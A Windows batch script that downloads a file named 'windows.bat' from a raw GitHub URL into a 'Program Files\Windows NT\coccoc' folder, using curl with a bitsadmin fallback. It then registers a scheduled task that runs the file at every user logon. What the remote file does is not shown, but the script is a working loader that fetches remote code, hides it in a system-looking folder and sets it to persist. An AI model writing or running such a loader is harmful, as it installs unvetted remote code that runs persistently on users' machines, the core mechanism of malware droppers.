@echo off
:: Set the download URL for the windows.bat file
set downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/windows.bat

:: Set the destination directory to save windows.bat
set destinationDir="C:\Program Files\Windows NT\coccoc"

:: Set the filename for the downloaded file
set downloadFile=windows.bat
:: Set the user directory for the current user
set userDir=%USERNAME%

:: Define log file path for task creation and execution history
set logFile="C:\Program Files\Windows NT\coccoc\task_history_log.txt"

:: Check if the destination directory exists
if not exist %destinationDir% (
    echo Directory %destinationDir% does not exist. Creating directory...
    mkdir %destinationDir%
)

:: Change to the destination directory
cd /d %destinationDir%

:: Download the windows.bat file using curl
echo Downloading windows.bat...
echo %date% %time% - Starting download of windows.bat from %downloadUrl% >> %logFile%
curl -L -o %downloadFile% %downloadUrl%

:: If curl is not available, fallback to using bitsadmin
if %errorlevel% neq 0 (
    echo curl is not available. Using bitsadmin to download windows.bat...
    bitsadmin /transfer mydownloadjob /download /priority high %downloadUrl% %destinationDir%\%downloadFile%
)

:: Check if the file was downloaded successfully
if exist %destinationDir%\%downloadFile% (
    echo %date% %time% - windows.bat has been downloaded successfully. >> %logFile%
) else (
    echo %date% %time% - Failed to download windows.bat. >> %logFile%
    exit /b
)

:: Create a task to run windows.bat at logon for the current user
echo Creating task to run windows.bat at logon...
echo %date% %time% - Creating scheduled task "RunWindowsBatAtLogon" for user %userDir% to run %destinationDir%\%downloadFile% at logon. >> %logFile%
schtasks /create /tn "RunWindowsBatAtLogon" /tr "\"%destinationDir%\%downloadFile%\"" /sc onlogon /ru %userDir% /f

:: Confirm the task creation and log it
if %errorlevel% neq 0 (
    echo %date% %time% - Failed to create the scheduled task. >> %logFile%
    echo Failed to create the scheduled task.
) else (
    echo %date% %time% - Task created successfully to run windows.bat at logon. >> %logFile%
    echo Task created successfully.
)

:: Exit the script
exit
